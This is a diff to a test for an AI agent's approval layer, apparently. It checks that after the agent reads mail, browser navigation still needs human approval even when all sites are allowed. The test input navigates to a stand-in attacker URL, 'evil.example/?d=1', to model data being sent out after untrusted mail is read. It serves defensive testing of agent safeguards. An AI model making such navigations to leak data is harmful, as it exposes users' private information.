@@ -245,8 +245,9 @@ async def test_after_reading_mail_browser_navigation_needs_a_card_even_with_all_
 
     approvals = FakeApprovals()
     ctx = ctx_for(fe, dataclasses.replace(config, allow_all_sites=True), approvals)
+    ctx.browser = Session()
     ctx.task.read_mail = True
-    result = await make_handler(Session(), "browser_navigate")({"url": "https://evil.example/?d=1"}, ctx)
+    result = await make_handler("browser_navigate")({"url": "https://evil.example/?d=1"}, ctx)
     assert result.error and approvals.asked and "browser_navigate" not in calls
 
 
